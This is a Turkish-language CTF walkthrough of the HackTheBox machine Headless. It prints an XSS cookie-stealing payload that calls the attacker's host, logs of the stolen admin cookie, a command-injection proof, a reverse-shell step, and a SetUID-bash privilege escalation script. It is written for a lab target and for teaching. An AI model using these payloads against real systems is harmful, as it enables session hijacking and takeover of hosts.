---
{"dg-publish":true,"permalink":"/ctf/headless-ctf/"}
---


1-  nmap -p- --min-rate 10000 10.10.11.8

![Pasted image 20241016150254.png](/img/user/resimler/Pasted%20image%2020241016150254.png)

nmap iki açık TCP portu bulur, SSH (22) ve HTTP (5000):

```shell-session
nmap -p 22,5000 -sCV 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 08:03 EDT
Nmap scan report for 10.10.11.8
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 16 Oct 2024 12:03:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/16%Time=670FAB90%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2
SF:\x20Python/3\.11\.2\r\nDate:\x20Wed,\x2016\x20Oct\x202024\x2012:03:29\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_
SF:Zfs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n
SF:\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wi
SF:dth,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construc
SF:tion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:
SF:\x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20d
SF:isplay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justi
SF:fy-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x2
SF:00,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTY
SF:PE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\
SF:x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20res
SF:ponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20ver
SF:sion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error
SF:\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\
SF:x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.63 seconds

```

* OpenSSH sürümüne göre, host muhtemelen Debian 12 bookworm çalıştırıyor.

* 5000'deki web sunucusu Python / Werkzeug çalıştırıyor.

### Website - TCP 80/5000

Site
Site çöktü:


![Pasted image 20241016151116.png](/img/user/resimler/Pasted%20image%2020241016151116.png)Bağlantı, bir iletişim formu sunan /support adresine yönlendirir:

![Pasted image 20241016151235.png](/img/user/resimler/Pasted%20image%2020241016151235.png)

Gönder'e tıklandığında herhangi bir geri bildirim görünmüyor. Burp'a (tüm HTB trafiğimin proxy'lendiği yer) bakıyorum ve POST isteğinin gönderildiğini ve yanıtın 200 OK olduğunu görüyorum:

![Pasted image 20241016151514.png](/img/user/resimler/Pasted%20image%2020241016151514.png)

![Pasted image 20241016151524.png](/img/user/resimler/Pasted%20image%2020241016151524.png)

![Pasted image 20241016151711.png](/img/user/resimler/Pasted%20image%2020241016151711.png)

![Pasted image 20241016153247.png](/img/user/resimler/Pasted%20image%2020241016153247.png)
İçerik görüntülenmiyor, ancak tüm HTTP istek üstbilgileri görüntüleniyor gibi görünüyor.

![Pasted image 20241016153723.png](/img/user/resimler/Pasted%20image%2020241016153723.png)

is_admin çerezini ayarladığını not edeceğim. Bu çerezle ilgili bakabileceğim daha fazla şey var, ancak Headless'ı çözmek için önemli değil, bu yüzden çerezin kodunu çözmek, çerezi değiştirmek ve Beyond Root'ta işleyen kaynağa bakmak gibi şeyler yapacağım.

![Pasted image 20241016153852.png](/img/user/resimler/Pasted%20image%2020241016153852.png)

İkinci string URL-güvenli base64 kodludur (_ karakteri standart base64 alfabesinin bir parçası değildir). Cyberchef'te rastgele anlamsız olsa da (imza olarak mantıklı olabilir) kolayca çözülür:

404 sayfası varsayılan Flask 404 sayfasıyla eşleşir:
![Pasted image 20241016154040.png](/img/user/resimler/Pasted%20image%2020241016154040.png)
Bu noktada sitenin muhtemelen Python Flask üzerinde çalıştığını söyleyebilirim.


Dizin Kaba Kuvveti
Diğer sayfaları / uç noktaları kontrol etmek için feroxbuster'ı siteye karşı çalıştıracağım:

![Pasted image 20241016160036.png](/img/user/resimler/Pasted%20image%2020241016160036.png)

Zaten /support'u araştırdım. /dashboard 500 döndürüyor (bu bir iç sunucu hatasıdır). Ziyaret edildiğinde yetkisiz bir sayfa gösteriliyor (ve ilginç bir şekilde 500 değil HTTP 401, bunu Beyond Root'ta açıklayacağım):


Aşağıdaki ffuf seçenekleriyle gönderirken sorunlara neden olabilecek tek bir karakteri kontrol etmeyi deneyeceğim:

-u http://10.10.11.8:5000/support - Fuzz için URL
-d 'fname=0xdf&lname=0xdf&email=0xdf@headless.htb&phone=9999999999&message=FUZZ' - Gönderilecek veri, FUZZed öğesi mesaj olacak şekilde
-w /opt/SecLists/Fuzzing/alphanum-case-extra.txt - Satır başına bir grup tek karakter içeren kelime listesi
-H 'Content-Type: application/x-www-form-urlencoded' - Bunu eklemeniz gerekir, aksi takdirde sunucu 500 döndürür
-mr 'IP adresiniz işaretlendi' - Yalnızca bu satırı içeren sonuçları gösterir.

Hiçbir şey tetiklemiyor:
![Pasted image 20241016160737.png](/img/user/resimler/Pasted%20image%2020241016160737.png)


Repeater
Engellemeyi tetikleyen talebi Burp Repeater'a götüreceğim:
![Pasted image 20241016160814.png](/img/user/resimler/Pasted%20image%2020241016160814.png)

Mesajı URL ile çözüyorum ve yine de tetikleniyor:

![Pasted image 20241016160839.png](/img/user/resimler/Pasted%20image%2020241016160839.png)
Bu bana yeni bir şey öğretmiyor ama daha kolay oynamamı sağlıyor.

İyi bir teknik, artık bir sorunu tetiklemeyene kadar karakterleri birer birer silmektir. Bu durumda, ilk > kaldırıldığında, uyarıyı tetiklemeyi durdurur:

![Pasted image 20241016160922.png](/img/user/resimler/Pasted%20image%2020241016160922.png)
">" tek başına tetiklemiyor. Tahminimce HTML etiketlerini arıyor, bu yüzden hem < hem de >'e ihtiyaç duyuyor:
![Pasted image 20241016161021.png](/img/user/resimler/Pasted%20image%2020241016161021.png)
Ayrıca SSTI girişimlerinde de tetiklenir (hem {{ hem de }}):

![Pasted image 20241016161305.png](/img/user/resimler/Pasted%20image%2020241016161305.png)


### Gösterge Tablosuna Erişim
POC
XSS veya SSTI'yi bu bloktan geçirmek zor olacaktır. Ancak yalnızca tespit edildiğini değil, aynı zamanda yüksek öncelikli inceleme için gönderildiğini de söylüyor. İnceleme için gönderilen veriler geri görüntülenenlere benziyorsa, bunun içinde XSS yapabilir miyim?

Eklediğim tüm başlıklar dahil edildi:

![Pasted image 20241016161437.png](/img/user/resimler/Pasted%20image%2020241016161437.png)
Bu başlığa (veya herhangi bir başlığa) bir "<script" etiketi eklersem, işlem gerçekleşiyor gibi görünüyor:

![Pasted image 20241016161508.png](/img/user/resimler/Pasted%20image%2020241016161508.png)
“show response in browser” seçeneği burada kullanışlıdır:
![Pasted image 20241016161601.png](/img/user/resimler/Pasted%20image%2020241016161601.png)
That’s XSS:
![Pasted image 20241016161610.png](/img/user/resimler/Pasted%20image%2020241016161610.png)


#### Cookie Steal
En basit XSS payload'u, rapora bakan kişinin çerezini çalmaktır. Basit bir çerez hırsızı ekleyeceğim:
```shell-session
<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
```
Bu, sunucumda kullanıcının cookie'sini içeren bir kaynak URL ile sayfaya yeni bir <img> etiketi ekleyecektir. Bunun çalışması için çerezin HttpOnly olarak yapılandırılmamış olması gerekir ki Firefox geliştirme araçları bunun False olduğunu gösterir:
![Pasted image 20241016161749.png](/img/user/resimler/Pasted%20image%2020241016161749.png)
python -m http.server 80 kullanarak bir Python web sunucusu başlatacağım. Python binary'me cap_net_bind_service verdim, böylece root olmadan düşük portları dinleyebilir. Bu olmadan sudo'yu çalıştırmam gerekir. Ayrıca, benim python'um Python3.

![Pasted image 20241016161848.png](/img/user/resimler/Pasted%20image%2020241016161848.png)
Şimdi repeater'da payload'ı göndereceğim:
![Pasted image 20241016161923.png](/img/user/resimler/Pasted%20image%2020241016161923.png)
Render'daki Yanıt ile gerçekten tetikleniyor ve web sunucuma ulaşıyor:
![Pasted image 20241016161946.png](/img/user/resimler/Pasted%20image%2020241016161946.png)
Cookie'si yok, bu yüzden boş. Bir dakikadan kısa bir süre sonra, Headless'tan daha fazla bağlantı var:

![Pasted image 20241016162043.png](/img/user/resimler/Pasted%20image%2020241016162043.png)

```shell-session
10.10.11.8 - - [11/Jul/2024 14:57:30] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 - 10.10.11.8 - - [11/Jul/2024 14:57:33] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 - 10.10.11.8 - - [11/Jul/2024 14:57:35] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```

Access Dashboard
Firefox geliştirme araçları, Storage sekmesine gideceğim ve çerezimi bu değerle değiştireceğim:

![Pasted image 20241016162115.png](/img/user/resimler/Pasted%20image%2020241016162115.png)

Şimdi /dashboard ziyaret edildiğinde farklı bir sayfa yükleniyor:

![Pasted image 20241016162153.png](/img/user/resimler/Pasted%20image%2020241016162153.png)


### Command Injection RCE

Dashboard Enumeration
“Rapor Oluştur” seçeneğine tıklandığında formun altında bir mesaj görüntülenir:
Tıklandığında gönderilen HTTP isteği şudur:


![Pasted image 20241016162918.png](/img/user/resimler/Pasted%20image%2020241016162918.png)

#### Command Injection POC
Tarayıcıda, alanları tarih dışında bir şeyle değiştiremiyorum. Ancak Burp'te isteklerle oynayabilirim. Bu isteği Repeater'a göndereceğim.

Sunucunun ne yaptığını düşünürsem, muhtemelen tarihi alıyor ve o tarihte rapor için neler olduğu hakkında bilgi arıyor. Bunu Python'dan yapabiliyorsa, bu onun için iyidir. Ancak bazı sistem komutlarını çalıştırması gerekiyorsa, benim girdimi alıp ondan komutu oluşturuyor ve sonra bu dizgiyle subprocess.run veya os.system gibi bir şey çağırıyor olabilir. Bunu kontrol etmek için tarihin sonuna ; id eklemeyi deneyeceğim:

![Pasted image 20241016163027.png](/img/user/resimler/Pasted%20image%2020241016163027.png)
İşe yaradı! id komutunun çıktısı yanıtta görüntülenir.

SSH üzerinden Shell
dvir kullanıcısının home dizininde özel bir SSH anahtarı olup olmadığını hızlıca kontrol edebilirim, ancak orada bir tane yok:

![Pasted image 20241016163124.png](/img/user/resimler/Pasted%20image%2020241016163124.png)
Kendim yazabilirim. Bir anahtar oluşturacağım (kısa oldukları için ed25519'u seviyorum):
![Pasted image 20241016163154.png](/img/user/resimler/Pasted%20image%2020241016163154.png)

key.pub içeriğini bir authorized_keys dosyasına koymam gerekiyor:

![Pasted image 20241016163242.png](/img/user/resimler/Pasted%20image%2020241016163242.png)

Şimdi SSH ile bağlanacağım:
![Pasted image 20241016163315.png](/img/user/resimler/Pasted%20image%2020241016163315.png)

Ve user.txt dosyasını okuyabiliyorum:
![Pasted image 20241016163336.png](/img/user/resimler/Pasted%20image%2020241016163336.png)

Reverse Shell ile Kabuk

Basit bir Bash ters kabuğu kullanacağım (bu videoda [ayrıntılı](https://www.youtube.com/watch?v=OjkVep2EIlw) olarak ele alıyorum):

Yeni bir POST parametresinin başlangıcıyla karıştırılmamaları için & karakterlerini manuel olarak %26 olarak kodladım. nc'yi 443 numaralı bağlantı noktasından dinlemeye başlatacağım ve bunu göndereceğim. Bağlantı kilitleniyor. nc'de:
![Pasted image 20241016163523.png](/img/user/resimler/Pasted%20image%2020241016163523.png)

Standart shell [yükseltmesi](https://www.youtube.com/watch?v=DqE6DxqJg8Q) yapacağım:
![Pasted image 20241016163608.png](/img/user/resimler/Pasted%20image%2020241016163608.png)

Ve user.txt dosyasını al:
![Pasted image 20241016163626.png](/img/user/resimler/Pasted%20image%2020241016163626.png)


## Shell as root

### Enumeration

Users / Home Directories
dvir'in home dizininde çok fazla ilgi çekici şey yoktur:
![Pasted image 20241016163711.png](/img/user/resimler/Pasted%20image%2020241016163711.png)
.mozilla klasörü, içinde bir profil olsaydı ilginç olabilirdi, ama yok:
![Pasted image 20241016163730.png](/img/user/resimler/Pasted%20image%2020241016163730.png)

home veya shells içinde home dizinleri olan başka kullanıcılar yoktur:

![Pasted image 20241016163801.png](/img/user/resimler/Pasted%20image%2020241016163801.png)


sudo
sudo -l bu kullanıcının diğer kullanıcılar olarak neleri çalıştırabileceğini gösterir:
![Pasted image 20241016163822.png](/img/user/resimler/Pasted%20image%2020241016163822.png)
dvir kullanıcısı syscheck'i parolası olmayan herhangi bir kullanıcı olarak çalıştırabilir.

### syscheck

#### Metadata
Bu çıktıda, `dvir` kullanıcısının **şifresiz** olarak `sudo` komutuyla `/usr/bin/syscheck` komutunu çalıştırabileceği belirtiliyor. Ancak, burada verilen `syscheck` uygulamasının tam olarak ne yaptığı, sistemde nasıl yapılandırıldığına bağlıdır ve varsayılan olarak tüm Linux dağıtımlarında yer alan bir komut değildir. Bu, özel bir komut olabilir veya bir güvenlik aracı olabilir.

syscheck bir Bash scriptidir:
![Pasted image 20241016164032.png](/img/user/resimler/Pasted%20image%2020241016164032.png)

Bunun gerçek bir dosya mı yoksa Headless için oluşturulmuş bir şey mi olduğunu merak ediyorum. “syscheck” araması birçok şey döndürüyor, ancak açıkça eşleşen bir şey yok. Dosyanın bir özetini alacağım:

![Pasted image 20241016164055.png](/img/user/resimler/Pasted%20image%2020241016164055.png)

Bunu VirusTotal'daki arama alanına yazıyorum ve geri dönüyor:

![Pasted image 20241016164111.png](/img/user/resimler/Pasted%20image%2020241016164111.png)

Eğer bu gerçek dünyada kullanılan bir araç olsaydı, şimdiye kadar VT'ye ulaşmış olması gerekirdi. Bu da Headless için özel olduğunu gösteriyor.


==Çalıştır==
/usr/bin benim $PATH'imde olduğu için onu çalıştırabiliyorum. Normal bir kullanıcı olarak hiçbir şey yapmıyor. Ama root olarak, çıktısı var:
![Pasted image 20241016164223.png](/img/user/resimler/Pasted%20image%2020241016164223.png)


### Kaynak
Senaryo çok uzun değil:
![Pasted image 20241016164303.png](/img/user/resimler/Pasted%20image%2020241016164303.png)

İlk olarak çalışan kullanıcının root olup olmadığını kontrol eder ve değilse çıkar:
![Pasted image 20241016164335.png](/img/user/resimler/Pasted%20image%2020241016164335.png)

/boot içindeki vmlinuz dosyasının son değiştirilme zamanını alır ve yazdırır:

```shell-session
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1) formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M") /usr/bin/echo "Last Kernel Modification Time: $formatted_time"
```

df -h çıktısını ayrıştırır ve bunu yazdırır:

![Pasted image 20241016164437.png](/img/user/resimler/Pasted%20image%2020241016164437.png)

Çalışma süresi çıktısının bir kısmını alır ve bunu yazdırır:

![Pasted image 20241016164500.png](/img/user/resimler/Pasted%20image%2020241016164500.png)

Daha sonra pgrep kullanarak proses listesinde initdb.sh ile ilgili herhangi bir şey arar. Eğer bir şey bulamazsa, ./initdb.sh dosyasını yazdırır ve çalıştırır. Aksi takdirde sadece yazdırır:

![Pasted image 20241016164526.png](/img/user/resimler/Pasted%20image%2020241016164526.png)

Sonra çıkar:
![Pasted image 20241016164546.png](/img/user/resimler/Pasted%20image%2020241016164546.png)

initdb.sh
Aslında önemli değil, ancak diskte initdb.sh adlı bir dosya arayabilirim:
![Pasted image 20241016164638.png](/img/user/resimler/Pasted%20image%2020241016164638.png)
Hiçbir şey bulamıyor. dvir'in erişiminin olmadığı bir dizinde olabilir.

Ama yine de bu önemli değil. ./initdb.sh olarak çağrılır, yani arayan kişi hangi dizindeyse o dizinde o dosyayı arayacaktır.


Exploit
bash'i /tmp/0xdf dosyasına kopyalayacak, bu dosyanın sahibini root olarak ayarlayacak ve ardından SetUID/SetGID olarak ayarlayacak (yani çalıştıran kullanıcı olarak değil sahibi olarak çalışacak) basit bir Bash betiği yazacağım. Bu bana etkin bir şekilde root olarak çalışan bir bash kopyası verir:

```shell-session
dvir@headless:/dev/shm$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 6777 /tmp/0xdf' | tee initdb.sh #!/bin/bash cp /bin/bash /tmp/0xdf chown root:root /tmp/0xdf chmod 6777 /tmp/0xdf dvir@headless:/dev/shm$ chmod +x initdb.sh
```

Ayrıca script'i çalıştırılabilir hale getirmek de önemlidir.

sudo syscheck'i çalıştıracağım:

![Pasted image 20241016164838.png](/img/user/resimler/Pasted%20image%2020241016164838.png)

Şimdi /tmp/0xdf var:
![Pasted image 20241016164857.png](/img/user/resimler/Pasted%20image%2020241016164857.png)

Bunu -p ile çalıştıracağım (bash bu olmadan ayrıcalıkları düşürecektir) ve bir root shell elde edeceğim:
![Pasted image 20241016164926.png](/img/user/resimler/Pasted%20image%2020241016164926.png)

Binary'yi temizleyip root bayrağını alacağım:
![Pasted image 20241016164950.png](/img/user/resimler/Pasted%20image%2020241016164950.png)


Root'un Ötesinde
